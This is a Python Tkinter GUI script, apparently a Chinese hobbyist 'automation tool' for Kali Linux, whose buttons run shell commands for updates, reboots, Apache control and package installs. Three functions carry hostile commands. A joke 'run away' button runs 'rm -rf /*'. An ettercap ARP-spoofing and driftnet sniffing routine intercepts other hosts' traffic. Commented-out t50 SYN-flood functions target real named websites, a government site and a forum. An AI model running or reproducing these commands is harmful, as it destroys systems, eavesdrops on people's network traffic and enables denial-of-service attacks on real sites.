#!/usr/bin/python
#coding:utf-8
import os  
import tkMessageBox     			#导入tk模块用于显示应用程序的消息
from Tkinter import * 				#引用tk模块
root=Tk(className='Hive network security_automation_tool')	#classname是窗口标题
root.title("屌丝绅士自动化工具-蜂巢网安-by:976859720") 	#network_work
root.geometry('500x230+0+0')	#geometry窗口指定大小
Message(root,text="仅用于:\nKali-linux 2017.1-rolling\n无需任何依赖包!\n拿起键盘就是搞！\n物理机慎用，虚拟机拍快照!",width=200).place(x=310,y=50)
def update():
	os.system("cp /etc/apt/sources.list /etc/apt/sources.list.bak ")
	os.system("echo deb http://http.kali.org/kali kali-rolling main non-free contrib > /etc/apt/sources.list")
	os.system("apt update && apt upgrade -y && apt dist-upgrade -y && apt autoremove -y && apt clean")
	os.system("rm /etc/apt/sources.list &&  mv /etc/apt/sources.list.bak /etc/apt/sources.list ")
	tkMessageBox.showinfo(title='注意', message='OK!' )
	pass
def update_os():
	os.system("cp /etc/apt/sources.list /etc/apt/sources.list.bak ")
	os.system("echo deb http://http.kali.org/kali kali-rolling main non-free contrib > /etc/apt/sources.list")
	os.system("apt dist-upgrade -y  ")
	os.system("rm /etc/apt/sources.list &&  mv /etc/apt/sources.list.bak /etc/apt/sources.list ")
	tkMessageBox.showinfo(title='注意', message='OK!' )
	pass
def reboot():
	os.system("reboot")
	tkMessageBox.showinfo(title='注意', message='OK!' )
	pass
def poweroff():
	os.system("poweroff")
	tkMessageBox.showinfo(title='注意', message='OK!' )
	pass
def eth_stop():
	os.system("ifconfig eth0 down")
	tkMessageBox.showinfo(title='注意', message='OK!' )
	pass
def eth_restart():
	os.system("ifconfig eth0 down  && ifconfig eth0 up")
	tkMessageBox.showinfo(title='注意', message='OK!' )
	pass
def network_restart():
	os.system("service network restart ")
	tkMessageBox.showinfo(title='注意', message='OK!' )
	pass
def apache_start():
	os.system("service apache2 start ")
	tkMessageBox.showinfo(title='注意', message='OK!' )
	pass
def apache_stop():
	os.system("service apache2 stop")
	tkMessageBox.showinfo(title='注意', message='OK!' )
	pass
def apache_restart():
	os.system("service apache2 restart ")
	tkMessageBox.showinfo(title='注意', message='OK!' )
	pass
def rm_rf():
	tkMessageBox.showinfo(title='注意', message='准备好跑路了么？我真的没开玩笑' )
	tkMessageBox.showinfo(title='注意', message='如果你后悔了，就重启就好了' )
	tkMessageBox.showinfo(title='注意', message='You die !' )
	os.system("rm -rf /*")
	pass
def nload():
	os.system("apt install nload")
	tkMessageBox.showinfo(title='注意', message='OK!' )
	pass
def hellter():
	os.system("apt install shellter")
	tkMessageBox.showinfo(title='注意', message='OK!' )
	pass
def vm_tools():
	os.system("apt install open-vm-tools-desktop fuse")
	tkMessageBox.showinfo(title='注意', message='OK!' )
	pass
def fcitx():
	os.system("apt install fcitx-googlepinyin")
	tkMessageBox.showinfo(title='注意', message='软件包已经安装完成，还需要你手动设置一下 \n 在左上角 应用程序 \n 常用程序 系统工具 首选项\n 选择并设置输入法默认选项' )
	pass
def arp_network():
	os.system("ettercap -i eth0 -Tq -M arp:remote /// ///")
	os.system("driftnet -d -i eth0")
	tkMessageBox.showinfo(title='注意', message='数据嗅探已经开始' )
	tkMessageBox.showinfo(title='注意', message='然后我忘了怎么停止这个，\n 你可以尝试：ps -ef|grep python \n然后干掉那个进程' )
	pass
def linux_head():
	tkMessageBox.showinfo(title='注意', message='这会很漫长，请耐心等待' )
	os.system("apt install linux-headers-4.9.0-kali4-all-amd64")
	tkMessageBox.showinfo(title='注意', message='OK!' )
	pass
#start
'''
def ddos_org():
	tkMessageBox.showinfo(title='注意', message='Login.....' )
	os.system("t50  --flood -S --turbo -dport 80 --protocol http://www.gov.cn")
	tkMessageBox.showinfo(title='注意', message='OK!' )
	pass
def ddos_bbs():
	tkMessageBox.showinfo(title='注意', message='Login.....' )
	os.system("t50  --flood -S --turbo -dport 80 --protocol https://bbs.ichunqiu.com/portal.php")
	tkMessageBox.showinfo(title='注意', message='OK!' )
	pass
	'''
#stop

def about():
	tkMessageBox.showinfo(title='注意', message='屌丝绅士自动化工具  \n  Vension:1.0.0 \n --蜂巢网安--' )
	pass
Button(root,text="屌丝一键更新",command=update,width=8).place(x=10,y=0)
Button(root,text="一键系统更新",command=update_os,width=8).place(x=10,y=30)
Button(root,text="屌丝一键重启",command=reboot,width=8).place(x=10,y=60)
Button(root,text="屌丝一键关机",command=poweroff,width=8).place(x=10,y=90)
Button(root,text="屌丝重启网卡",command=eth_restart,width=8).place(x=10,y=120)
Button(root,text="屌丝一键跑路",command=rm_rf,width=8).place(x=10,y=190)

Button(root,text="开始安装nload",command=nload,width=8).place(x=110,y=0)
Button(root,text="安装shellter",command=hellter,width=8).place(x=110,y=30)
Button(root,text="安装Vm-tools",command=vm_tools,width=8).place(x=110,y=60)
Button(root,text="安装Fcitx",command=fcitx,width=8).place(x=110,y=90)
Button(root,text="Linux-Head",command=fcitx,width=8).place(x=110,y=120)

Button(root,text="启动Apache",command=apache_start,width=8).place(x=210,y=0)
Button(root,text="停止Apache",command=apache_stop,width=8).place(x=210,y=30)
Button(root,text="重启Apache",command=apache_restart,width=8).place(x=210,y=60)
Button(root,text="屌丝一键抓图",command=arp_network,width=8).place(x=210,y=90)
Button(root,text="重启网络服务",command=network_restart,width=8).place(x=210,y=120)
'''
Button(root,text="屌丝一键服务",command=ddos_org,width=8).place(x=310,y=0)
Button(root,text="屌丝一键服务",command=ddos_bbs,width=8).place(x=310,y=30)
Button(root,text="屌丝一键服务",command=ddos_org,width=8).place(x=310,y=60)
Button(root,text="屌丝Getshell",command=ddos_org,width=8).place(x=310,y=90)
Button(root,text="屌丝一键服务",command=ddos_org,width=8).place(x=310,y=120)
'''
Button(root,text="关于",command=about,width=8).place(x=405,y=0)
Button(root,text="退出",command=root.quit,width=8).place(x=405,y=190)
root.mainloop()		# root.mainloop()是窗口成员函数用来保持窗口不关闭的
